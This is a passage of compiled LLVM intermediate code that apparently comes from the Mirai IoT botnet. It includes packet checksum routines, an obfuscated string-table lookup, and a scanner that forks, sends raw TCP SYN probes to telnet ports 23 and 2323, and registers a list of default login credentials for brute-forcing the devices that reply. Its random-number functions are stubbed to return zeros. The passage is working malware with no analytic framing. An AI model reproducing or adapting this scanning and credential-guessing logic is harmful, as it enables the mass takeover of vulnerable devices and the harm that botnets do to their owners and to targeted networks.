  %.01114 = phi i32 [ %.01114.unr, %.lr.ph.preheader.new ], [ %30, %.lr.ph ]
  %.01213 = phi i16* [ %.01213.unr, %.lr.ph.preheader.new ], [ %26, %.lr.ph ]
  %14 = getelementptr inbounds i16, i16* %.01213, i64 1
  %15 = load i16, i16* %.01213, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.015
  %18 = getelementptr inbounds i16, i16* %.01213, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01213, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01213, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add i32 %.01114, -8
  %31 = icmp ugt i32 %30, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit.unr-lcssa

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.lcssa = phi i64 [ %.lcssa.unr, %.lr.ph.prol.loopexit ], [ %29, %._crit_edge.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %33 = icmp eq i32 %.011.lcssa, 1
  br i1 %33, label %34, label %39

; <label>:34:                                     ; preds = %._crit_edge
  %35 = load i16, i16* %.012.lcssa, align 2
  %36 = zext i16 %35 to i64
  %sext = shl i64 %36, 56
  %37 = ashr exact i64 %sext, 56
  %38 = add i64 %37, %.0.lcssa
  br label %39

; <label>:39:                                     ; preds = %34, %._crit_edge
  %.1 = phi i64 [ %38, %34 ], [ %.0.lcssa, %._crit_edge ]
  %40 = lshr i64 %.1, 16
  %41 = and i64 %.1, 65535
  %42 = add nuw nsw i64 %40, %41
  %43 = lshr i64 %42, 16
  %44 = add nuw nsw i64 %43, %42
  %45 = trunc i64 %44 to i16
  %46 = xor i16 %45, -1
  ret i16 %46
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !3

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #11
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 28)
  %4 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  %5 = tail call i8* @table_retrieve_val(i32 28, i32* null)
  %6 = call i8* @strcpy(i8* nonnull %4, i8* %5) #10
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %8, %.lr.ph ], [ %1, %.lr.ph.preheader ]
  %.012 = phi i8* [ %11, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %8 = add nsw i32 %.03, -1
  %9 = call i32 @util_strlen(i8* nonnull %4) #10
  %10 = load i8, i8* %4, align 16
  %11 = getelementptr inbounds i8, i8* %.012, i64 1
  store i8 %10, i8* %.012, align 1
  %12 = icmp eq i32 %8, 0
  br i1 %12, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  call void @table_lock_val(i8 zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() local_unnamed_addr #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set.26, align 8
  %3 = alloca %struct.fd_set.26, align 8
  %4 = alloca %struct.timeval.27, align 8
  %5 = alloca [1514 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = tail call i32 @fork() #10
  store i32 %13, i32* @scanner_pid, align 4
  %14 = icmp sgt i32 %13, 0
  %15 = icmp eq i32 %13, -1
  %or.cond = or i1 %14, %15
  br i1 %or.cond, label %16, label %17

; <label>:16:                                     ; preds = %0
  ret void

; <label>:17:                                     ; preds = %0
  %18 = tail call i32 @util_local_addr() #10
  store i32 %18, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init() #10
  %19 = tail call i64 @time(i64* null) #10
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @fake_time, align 4
  %21 = tail call noalias i8* @calloc(i64 256, i64 296) #10
  store i8* %21, i8** bitcast (%struct.scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  %.cast = bitcast i8* %21 to %struct.scanner_connection*
  br label %22

; <label>:22:                                     ; preds = %22, %17
  %indvars.iv247 = phi i64 [ 0, %17 ], [ %indvars.iv.next248.7, %22 ]
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv247, i32 1
  store i32 -1, i32* %23, align 8
  %indvars.iv.next248 = or i64 %indvars.iv247, 1
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248, i32 1
  store i32 -1, i32* %24, align 8
  %indvars.iv.next248.1 = or i64 %indvars.iv247, 2
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.1, i32 1
  store i32 -1, i32* %25, align 8
  %indvars.iv.next248.2 = or i64 %indvars.iv247, 3
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.2, i32 1
  store i32 -1, i32* %26, align 8
  %indvars.iv.next248.3 = or i64 %indvars.iv247, 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.3, i32 1
  store i32 -1, i32* %27, align 8
  %indvars.iv.next248.4 = or i64 %indvars.iv247, 5
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.4, i32 1
  store i32 -1, i32* %28, align 8
  %indvars.iv.next248.5 = or i64 %indvars.iv247, 6
  %29 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.5, i32 1
  store i32 -1, i32* %29, align 8
  %indvars.iv.next248.6 = or i64 %indvars.iv247, 7
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %.cast, i64 %indvars.iv.next248.6, i32 1
  store i32 -1, i32* %30, align 8
  %indvars.iv.next248.7 = add nsw i64 %indvars.iv247, 8
  %exitcond.7 = icmp eq i64 %indvars.iv.next248.7, 256
  br i1 %exitcond.7, label %31, label %22

; <label>:31:                                     ; preds = %22
  store i32 256, i32* %1, align 4
  %32 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  store i32 %32, i32* @rsck, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %31
  tail call void @exit(i32 0) #12
  unreachable

; <label>:35:                                     ; preds = %31
  %36 = tail call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0) #10
  %37 = or i32 %36, 2048
  %38 = tail call i32 (i32, i32, ...) @fcntl(i32 %32, i32 4, i32 %37) #10
  store i32 1, i32* %1, align 4
  %39 = load i32, i32* @rsck, align 4
  %40 = bitcast i32* %1 to i8*
  %41 = call i32 @setsockopt(i32 %39, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %.preheader215, label %45

.preheader215:                                    ; preds = %35
  %43 = call zeroext i16 @ntohs(i16 zeroext 0) #11
  %44 = icmp ult i16 %43, 1024
  br i1 %44, label %.preheader215.split.preheader, label %.split

.preheader215.split.preheader:                    ; preds = %.preheader215
  br label %.preheader215.split

; <label>:45:                                     ; preds = %35
  %46 = load i32, i32* @rsck, align 4
  %47 = call i32 @close(i32 %46) #10
  call void @exit(i32 0) #12
  unreachable

.preheader215.split:                              ; preds = %.preheader215.split.preheader, %.preheader215.split
  br label %.preheader215.split

.split:                                           ; preds = %.preheader215
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), align 16
  %48 = call zeroext i16 @htons(i16 zeroext 40) #11
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 9), align 1
  %49 = call zeroext i16 @htons(i16 zeroext 23) #11
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %50 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = and i16 %50, -753
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %52 = or i16 %51, 592
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.1, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i16 zeroext 14)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i16 zeroext 11)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i64 0, i64 0), i16 zeroext 17)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.13, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i64 0, i64 0), i16 zeroext 15)
  %53 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 0
  %54 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 20
  %55 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %2, i64 0, i32 0, i64 0
  %56 = getelementptr inbounds %struct.fd_set.26, %struct.fd_set.26* %3, i64 0, i32 0, i64 0
  %57 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %4, i64 0, i32 1
  %58 = getelementptr inbounds %struct.timeval.27, %struct.timeval.27* %4, i64 0, i32 0
  %59 = bitcast i32* %6 to i8*
  %60 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 16
  %61 = bitcast i8* %60 to i32*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 9
  %63 = bitcast i8* %54 to i16*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 22
  %65 = bitcast i8* %64 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 32
  %67 = bitcast i8* %66 to i16*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 28
  %69 = bitcast i8* %68 to i32*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %5, i64 0, i64 12
  %71 = bitcast i8* %70 to i32*
  br label %.loopexit213

.loopexit213.loopexit:                            ; preds = %.loopexit
  br label %.loopexit213

.loopexit213:                                     ; preds = %.loopexit213.loopexit, %.split
  %72 = tail call i32* @__errno_location() #11
  store i32 0, i32* %72, align 4
  %73 = load i32, i32* @rsck, align 4
  %74 = call i64 @recvfrom(i32 %73, i8* nonnull %53, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #10
  %75 = trunc i64 %74 to i32
  %76 = icmp slt i32 %75, 1
  br i1 %76, label %.thread, label %.lr.ph226.preheader

.lr.ph226.preheader:                              ; preds = %.loopexit213
  br label %.lr.ph226

.lr.ph226:                                        ; preds = %.lr.ph226.preheader, %.backedge
  %77 = phi i64 [ %128, %.backedge ], [ %74, %.lr.ph226.preheader ]
  %.0225 = phi i32 [ %.0.be, %.backedge ], [ 0, %.lr.ph226.preheader ]
  %78 = load i32, i32* %72, align 4
  %79 = icmp eq i32 %78, 11
  br i1 %79, label %.thread.loopexit256, label %80

; <label>:80:                                     ; preds = %.lr.ph226
  %sext = shl i64 %77, 32
  %81 = ashr exact i64 %sext, 32
  %82 = icmp ult i64 %81, 40
  br i1 %82, label %.backedge, label %83

; <label>:83:                                     ; preds = %80
  %84 = load i32, i32* %61, align 16
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = icmp eq i32 %84, %85
  %87 = load i8, i8* %62, align 1
  %88 = icmp eq i8 %87, 6
  %or.cond240 = and i1 %86, %88
  br i1 %or.cond240, label %89, label %.backedge

; <label>:89:                                     ; preds = %83
  %90 = load i16, i16* %63, align 4
  %91 = icmp eq i16 %90, %49
  br i1 %91, label %97, label %92

; <label>:92:                                     ; preds = %89
  %93 = call zeroext i16 @htons(i16 zeroext 2323) #11
  %94 = icmp eq i16 %90, %93
  %95 = load i16, i16* %65, align 2
  %96 = icmp eq i16 %95, 0
  %or.cond242 = and i1 %94, %96
  br i1 %or.cond242, label %98, label %.backedge

; <label>:97:                                     ; preds = %89
  %.old = load i16, i16* %65, align 2
  %.old241 = icmp eq i16 %.old, 0
  br i1 %.old241, label %98, label %.backedge

; <label>:98:                                     ; preds = %92, %97
  %99 = load i16, i16* %67, align 16
  %100 = and i16 %99, 5888
  %101 = icmp eq i16 %100, 4608
  br i1 %101, label %102, label %.backedge

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* %69, align 4
  %104 = call i32 @ntohl(i32 %103) #11
  %105 = add i32 %104, -1
  %106 = call i32 @htonl(i32 %105) #11
  %107 = load i32, i32* %71, align 4
  %108 = icmp eq i32 %106, %107
  br i1 %108, label %.preheader, label %.backedge

.preheader:                                       ; preds = %102
  %109 = icmp slt i32 %.0225, 256
  br i1 %109, label %.lr.ph, label %.thread.loopexit256

.lr.ph:                                           ; preds = %.preheader
  %110 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %111 = sext i32 %.0225 to i64
  br label %112

; <label>:112:                                    ; preds = %.lr.ph, %116
  %indvars.iv = phi i64 [ %111, %.lr.ph ], [ %indvars.iv.next, %116 ]
  %113 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %110, i64 %indvars.iv, i32 3
  %114 = load i32, i32* %113, align 8
  %115 = icmp eq i32 %114, 0
  br i1 %115, label %118, label %116

; <label>:116:                                    ; preds = %112
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %117 = icmp slt i64 %indvars.iv.next, 256
  br i1 %117, label %112, label %.thread.loopexit

; <label>:118:                                    ; preds = %112
  %119 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %110, i64 %indvars.iv
  %120 = icmp eq %struct.scanner_connection* %119, null
  br i1 %120, label %.thread.loopexit256, label %121

; <label>:121:                                    ; preds = %118
  %122 = trunc i64 %indvars.iv to i32
  %123 = load i32, i32* %71, align 4
  %124 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %110, i64 %indvars.iv, i32 4
  store i32 %123, i32* %124, align 4
  %125 = load i16, i16* %63, align 4
  %126 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %110, i64 %indvars.iv, i32 5
  store i16 %125, i16* %126, align 8
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %119)
  br label %.backedge

.backedge:                                        ; preds = %121, %80, %83, %97, %102, %92, %98
  %.0.be = phi i32 [ %.0225, %80 ], [ %.0225, %83 ], [ %.0225, %92 ], [ %.0225, %97 ], [ %.0225, %102 ], [ %122, %121 ], [ %.0225, %98 ]
  store i32 0, i32* %72, align 4
  %127 = load i32, i32* @rsck, align 4
  %128 = call i64 @recvfrom(i32 %127, i8* nonnull %53, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #10
  %129 = trunc i64 %128 to i32
  %130 = icmp slt i32 %129, 1
  br i1 %130, label %.thread.loopexit256, label %.lr.ph226

.thread.loopexit:                                 ; preds = %116
  br label %.thread

.thread.loopexit256:                              ; preds = %.preheader, %.lr.ph226, %.backedge, %118
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit256, %.thread.loopexit, %.loopexit213
  %131 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %55) #10, !srcloc !4
